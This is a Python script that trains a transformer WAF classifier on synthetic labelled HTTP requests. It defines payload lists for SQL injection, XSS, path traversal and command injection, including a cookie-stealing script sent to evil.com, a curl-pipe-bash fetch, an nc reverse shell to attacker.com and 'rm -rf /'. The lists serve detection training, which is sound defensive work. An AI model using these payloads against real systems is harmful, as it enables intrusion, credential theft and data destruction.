"""
train.py  –  Train the WAF Transformer on synthetic + real-world payloads.

Usage:
    python train.py                    # train & save model.pt
    python train.py --epochs 20        # more epochs
"""

import argparse
import random
import torch
import torch.nn as nn
from torch.utils.data import Dataset, DataLoader
from model import WAFTransformer, encode, LABELS

# ── Synthetic Dataset ────────────────────────────────────────────────────────

NORMAL_REQUESTS = [
    "GET /index.html HTTP/1.1",
    "GET /api/users?page=1&limit=10 HTTP/1.1",
    "POST /login username=admin&password=secret HTTP/1.1",
    "GET /static/app.js HTTP/1.1",
    "GET /products?category=electronics&sort=price HTTP/1.1",
    "GET /about HTTP/1.1",
    "POST /api/orders id=42&qty=2 HTTP/1.1",
    "GET /search?q=laptop+bag HTTP/1.1",
    "GET /images/logo.png HTTP/1.1",
    "GET /favicon.ico HTTP/1.1",
    "POST /contact name=John&email=j@x.com&message=Hello HTTP/1.1",
    "GET /api/health HTTP/1.1",
    "GET /robots.txt HTTP/1.1",
    "GET /sitemap.xml HTTP/1.1",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1 UNION SELECT username,password FROM users--",
    "admin'--",
    "' OR 1=1--",
    "1; SELECT * FROM information_schema.tables",
    "' AND SLEEP(5)--",
    "\" OR \"\"=\"",
    "1 OR 1=1",
    "'; EXEC xp_cmdshell('dir')--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "' WAITFOR DELAY '0:0:5'--",
    "1' ORDER BY 3--",
    "admin' #",
    "' OR 'x'='x",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('xss')>",
    '"><script>document.location=\'http://evil.com/?c=\'+document.cookie</script>',
    "<script>window.location='http://attacker.com'</script>",
    "onmouseover=alert(1)",
    "<input type=text value='' onfocus=alert(1) autofocus>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

PATH_TRAVERSAL = [
    "../../../../etc/passwd",
    "../../../windows/system32/cmd.exe",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "..\\..\\..\\windows\\system.ini",
    "GET /../../../etc/shadow HTTP/1.1",
    "/var/www/../../etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%c0%afetc%c0%afpasswd",
]

CMD_INJECTION = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(id)",
    "; rm -rf /",
    "& net user",
    "| ls -la",
    "; ping -c 4 attacker.com",
    "`curl http://evil.com/shell.sh | bash`",
    "; nc -e /bin/sh attacker.com 4444",
    "|| wget http://evil.com/malware",
]


def make_sample(label_idx: int, text: str) -> tuple[list[int], int]:
    return encode(text), label_idx


def build_dataset(samples_per_class: int = 500):
    data = []

    def augment(base: str) -> str:
        prefix = random.choice([
            "GET /search?q=", "POST /api/data body=",
            "GET /page?id=", "GET /item?name=",
            "POST /form data=", "GET /cmd?run=",
        ])
        return prefix + base

    # Normal
    for _ in range(samples_per_class):
        t = random.choice(NORMAL_REQUESTS)
        data.append(make_sample(0, t))

    # SQLi
    for _ in range(samples_per_class):
        t = augment(random.choice(SQLI_PAYLOADS))
        data.append(make_sample(1, t))

    # XSS
    for _ in range(samples_per_class):
        t = augment(random.choice(XSS_PAYLOADS))
        data.append(make_sample(2, t))

    # Path traversal
    for _ in range(samples_per_class):
        t = "GET /" + random.choice(PATH_TRAVERSAL) + " HTTP/1.1"
        data.append(make_sample(3, t))

    # Cmd injection
    for _ in range(samples_per_class):
        t = augment(random.choice(CMD_INJECTION))
        data.append(make_sample(4, t))

    random.shuffle(data)
    return data


class WAFDataset(Dataset):
    def __init__(self, data):
        self.tokens = torch.tensor([d[0] for d in data], dtype=torch.long)
        self.labels = torch.tensor([d[1] for d in data], dtype=torch.long)

    def __len__(self): return len(self.labels)

    def __getitem__(self, idx):
        return self.tokens[idx], self.labels[idx]


# ── Training Loop ────────────────────────────────────────────────────────────

def train(epochs: int = 10, batch_size: int = 64, lr: float = 3e-4,
          save_path: str = "model.pt"):
    print("Building synthetic dataset...")
    data = build_dataset(samples_per_class=600)
    split = int(0.85 * len(data))
    train_ds = WAFDataset(data[:split])
    val_ds   = WAFDataset(data[split:])

    train_loader = DataLoader(train_ds, batch_size=batch_size, shuffle=True)
    val_loader   = DataLoader(val_ds,   batch_size=batch_size)

    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    print(f"Training on {device} | {len(train_ds)} train / {len(val_ds)} val")

    model = WAFTransformer().to(device)
    optimizer = torch.optim.AdamW(model.parameters(), lr=lr, weight_decay=1e-4)
    scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=epochs)
    criterion = nn.CrossEntropyLoss()

    best_acc = 0.0
    for epoch in range(1, epochs + 1):
        model.train()
        total_loss = 0
        for tokens, labels in train_loader:
            tokens, labels = tokens.to(device), labels.to(device)
            pad_mask = (tokens == 0)
            logits = model(tokens, pad_mask)
            loss = criterion(logits, labels)
            optimizer.zero_grad()
            loss.backward()
            nn.utils.clip_grad_norm_(model.parameters(), 1.0)
            optimizer.step()
            total_loss += loss.item()
        scheduler.step()

        # Validation
        model.eval()
        correct = total = 0
        with torch.no_grad():
            for tokens, labels in val_loader:
                tokens, labels = tokens.to(device), labels.to(device)
                pad_mask = (tokens == 0)
                preds = model(tokens, pad_mask).argmax(dim=-1)
                correct += (preds == labels).sum().item()
                total += labels.size(0)
        acc = correct / total
        print(f"Epoch {epoch:02d}/{epochs} | Loss: {total_loss/len(train_loader):.4f} | Val Acc: {acc:.3f}")

        if acc > best_acc:
            best_acc = acc
            torch.save(model.state_dict(), save_path)
            print(f"  ✓ Saved best model (acc={acc:.3f})")

    print(f"\nTraining complete. Best val accuracy: {best_acc:.3f}")
    print(f"Model saved to: {save_path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--epochs", type=int, default=10)
    parser.add_argument("--batch_size", type=int, default=64)
    parser.add_argument("--lr", type=float, default=3e-4)
    parser.add_argument("--save", type=str, default="model.pt")
    args = parser.parse_args()
    train(args.epochs, args.batch_size, args.lr, args.save)
